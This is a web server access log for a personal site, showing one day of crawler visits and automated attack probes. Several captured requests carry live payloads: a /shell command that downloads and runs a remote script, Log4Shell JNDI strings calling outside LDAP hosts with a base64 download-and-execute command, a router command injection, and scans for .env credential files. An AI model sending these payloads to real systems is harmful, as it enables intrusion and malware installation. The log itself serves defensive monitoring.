111.7.96.147 - - [09/Feb/2022:11:09:53 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" 400 166 "-" "-"
8.31.2.94 - - [09/Feb/2022:11:09:57 +0000] "GET / HTTP/1.1" 400 666 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
8.31.2.94 - - [09/Feb/2022:11:09:58 +0000] "GET /favicon.ico HTTP/1.1" 400 666 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
42.190.218.155 - - [09/Feb/2022:11:11:31 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws HTTP/1.1" 200 820 "-" "Hello, world"
45.146.165.37 - - [09/Feb/2022:11:20:29 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 166 "-" "-"
109.237.103.118 - - [09/Feb/2022:11:27:53 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.118 - - [09/Feb/2022:11:27:53 +0000] "\x16\x03\x01\x01D\x01\x00\x01@\x03\x03\xA1>\xF4\xE4bU\xED\x1C\x94W\x9F\xBBE" 400 166 "-" "-"
66.249.77.22 - - [09/Feb/2022:11:35:00 +0000] "GET /my-thoughts HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.241.212.56 - - [09/Feb/2022:11:40:55 +0000] "GET /actuator/health HTTP/1.1" 200 473 "-" "Mozilla/5.0 zgrab/0.x"
89.248.165.24 - - [09/Feb/2022:11:49:07 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
179.43.170.170 - - [09/Feb/2022:11:50:21 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
51.79.29.48 - - [09/Feb/2022:11:51:00 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/Feb/2022:11:51:00 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.180.143.72 - - [09/Feb/2022:11:58:35 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
66.249.77.18 - - [09/Feb/2022:12:04:59 +0000] "GET /skills HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.146.165.37 - - [09/Feb/2022:12:06:47 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.24.24.111 - - [09/Feb/2022:12:34:22 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "python-requests/2.27.1"
20.24.24.111 - - [09/Feb/2022:12:34:22 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "python-requests/2.27.1"
66.249.77.20 - - [09/Feb/2022:12:34:59 +0000] "GET /skills HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.77.20 - - [09/Feb/2022:12:35:02 +0000] "GET /js/chunk-vendors.8f0b0301.js HTTP/1.1" 200 120293 "https://justinapplegate.me/skills" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
61.219.11.151 - - [09/Feb/2022:12:40:05 +0000] "dN\x93\xB9\xE6\xBCl\xB6\x92\x84:\xD7\x03\xF1N\xB9\xC5;\x90\xC2\xC6\xBA\xE1I-\x22\xDDs\xBA\x1FgC:\xB1\xA7\x80+\x00\x00\x00\x00%\xFDK:\xAAW.|J\xB2\xB5\xF5'\xA5l\xD3V(\xB7\x01%(CsK8B\xCE\x9A\xD0z\xC7\x13\xAD" 400 166 "-" "-"
96.11.216.106 - - [09/Feb/2022:12:48:05 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
96.11.216.106 - - [09/Feb/2022:12:48:05 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
184.105.247.194 - - [09/Feb/2022:13:29:06 +0000] "GET / HTTP/1.1" 200 820 "-" "-"
87.251.64.90 - - [09/Feb/2022:13:36:40 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
128.14.133.58 - - [09/Feb/2022:13:48:31 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
87.251.64.90 - - [09/Feb/2022:13:51:07 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
185.254.196.223 - - [09/Feb/2022:14:06:07 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [09/Feb/2022:14:06:08 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
37.0.11.157 - - [09/Feb/2022:14:18:34 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
35.233.62.116 - - [09/Feb/2022:14:18:49 +0000] "GET / HTTP/1.1" 200 473 "-" "python-requests/2.27.1"
98.0.242.10 - - [09/Feb/2022:14:30:51 +0000] "GET / HTTP/1.1" 200 820 "-" "${jndi:ldap://185.8.172.132:1389/a}"
20.55.53.144 - - [09/Feb/2022:14:49:57 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
20.55.53.144 - - [09/Feb/2022:14:50:10 +0000] "GET / HTTP/1.1" 400 666 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
198.98.49.13 - - [09/Feb/2022:15:19:52 +0000] "GET /static_new6/img/login_bg.png HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
45.146.165.37 - - [09/Feb/2022:15:24:09 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.209.28 - - [09/Feb/2022:15:35:14 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 zgrab/0.x"
139.162.207.84 - - [09/Feb/2022:15:45:54 +0000] "GET /admin/ HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
81.209.147.6 - - [09/Feb/2022:15:58:58 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xBFA}er*" 400 166 "-" "-"
81.209.147.8 - - [09/Feb/2022:15:59:04 +0000] "GET / HTTP/1.0" 200 820 "-" "-"
81.209.147.6 - - [09/Feb/2022:15:59:13 +0000] "GET / HTTP/1.0" 200 820 "-" "-"
192.241.208.238 - - [09/Feb/2022:16:07:28 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 zgrab/0.x"
91.163.55.74 - - [09/Feb/2022:16:08:28 +0000] "GET / HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
51.79.29.48 - - [09/Feb/2022:16:25:40 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [09/Feb/2022:16:25:40 +0000] "GET /.env HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.165.37 - - [09/Feb/2022:16:44:28 +0000] "POST /mifs/.;/services/LogService HTTP/1.1" 405 568 "https://128.199.4.110:443" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.142.125.221 - - [09/Feb/2022:17:31:16 +0000] "GET / HTTP/1.1" 200 820 "-" "-"
162.142.125.221 - - [09/Feb/2022:17:31:16 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.221 - - [09/Feb/2022:17:31:16 +0000] "PRI * HTTP/2.0" 400 166 "-" "-"
162.214.213.31 - - [09/Feb/2022:17:46:29 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:29 +0000] "GET /conf/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:29 +0000] "GET /wp-content/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:29 +0000] "GET /wp-admin/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:30 +0000] "GET /library/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:30 +0000] "GET /new/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:30 +0000] "GET /vendor/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:30 +0000] "GET /old/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:30 +0000] "GET /local/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:30 +0000] "GET /api/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:30 +0000] "GET /blog/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:31 +0000] "GET /crm/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:31 +0000] "GET /admin/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:31 +0000] "GET /laravel/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:31 +0000] "GET /app/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:31 +0000] "GET /app/config/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:31 +0000] "GET /apps/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:32 +0000] "GET /audio/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:32 +0000] "GET /cgi-bin/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:32 +0000] "GET /backend/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:32 +0000] "GET /src/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:32 +0000] "GET /base/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:33 +0000] "GET /core/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:33 +0000] "GET /vendor/laravel/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:33 +0000] "GET /storage/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:33 +0000] "GET /protected/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:33 +0000] "GET /newsite/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:34 +0000] "GET /www/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:34 +0000] "GET /sites/all/libraries/mailchimp/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:34 +0000] "GET /database/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:34 +0000] "GET /public/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:34 +0000] "GET /justinapplegate.me/.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:34 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
162.214.213.31 - - [09/Feb/2022:17:46:34 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
45.146.165.37 - - [09/Feb/2022:17:53:26 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 405 568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.204.220.57 - - [09/Feb/2022:18:03:59 +0000] "GET /wp-login.php HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
92.204.220.57 - - [09/Feb/2022:18:04:00 +0000] "GET /wp-login.php HTTP/1.1" 200 473 "http://justinapplegate.me/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
222.139.36.165 - - [09/Feb/2022:18:40:08 +0000] "POST /HNAP1/ HTTP/1.0" 405 166 "-" "-"
154.89.5.94 - - [09/Feb/2022:18:45:40 +0000] "GET / HTTP/1.0" 200 820 "-" "-"
45.146.165.37 - - [09/Feb/2022:19:00:45 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.142.94 - - [09/Feb/2022:19:18:41 +0000] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.142.94 - - [09/Feb/2022:19:18:43 +0000] "GET /robots.txt HTTP/1.1" 200 473 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
45.146.165.37 - - [09/Feb/2022:19:35:30 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
125.46.136.96 - - [09/Feb/2022:20:05:27 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 405 166 "-" "Hello, World"
125.46.136.96 - - [09/Feb/2022:20:05:27 +0000] "sh+/tmp/gpon80&ipv=0" 400 166 "-" "-"
20.55.53.144 - - [09/Feb/2022:20:19:46 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x8FU\xE1{\x22\x90\xAE\xE0\x84\x95\xB7#_\xCF?\xB9=\x9C\xF6\xC7\x10(\x04\xFC\xA3\xDE@\x80\x0FR\x93v \xCB\xA2\xD9\xFC-\xB0\xC6\xEC\xBD\x17\xF3\xC9\xCD\x5C\x16\xCCn\xFA\xEE#\xD1\x8BNp\xF7?CD\xE1\x8A:\x8A\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"
20.55.53.144 - - [09/Feb/2022:20:19:48 +0000] "GET / HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
61.219.11.151 - - [09/Feb/2022:20:20:55 +0000] "dN\x93\xB9\xE6\xBCl\xB6\x92\x84:\xD7\x03\xF1N\xB9\xC5;\x90\xC2\xC6\xBA\xE1I-\x22\xDDs\xBA\x1FgC:\xB1\xA7\x80+\x00\x00\x00\x00%\xFDK:\xAAW.|J\xB2\xB5\xF5'\xA5l\xD3V(\xB7\x01%(CsK8B\xCE\x9A\xD0z\xC7\x13\xAD" 400 166 "-" "-"
198.98.61.124 - - [09/Feb/2022:20:24:19 +0000] "GET / HTTP/1.1" 200 820 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCB4ODYuZXhwbG9pdA==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCB4ODYuZXhwbG9pdA==}')"
40.87.92.117 - - [09/Feb/2022:20:31:54 +0000] "GET / HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:54 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:54 +0000] "GET / HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:55 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:55 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:55 +0000] "GET / HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:55 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:55 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:56 +0000] "GET / HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:56 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:56 +0000] "" 400 0 "-" "-"
40.87.92.117 - - [09/Feb/2022:20:31:56 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:56 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
40.87.92.117 - - [09/Feb/2022:20:31:56 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 200 820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
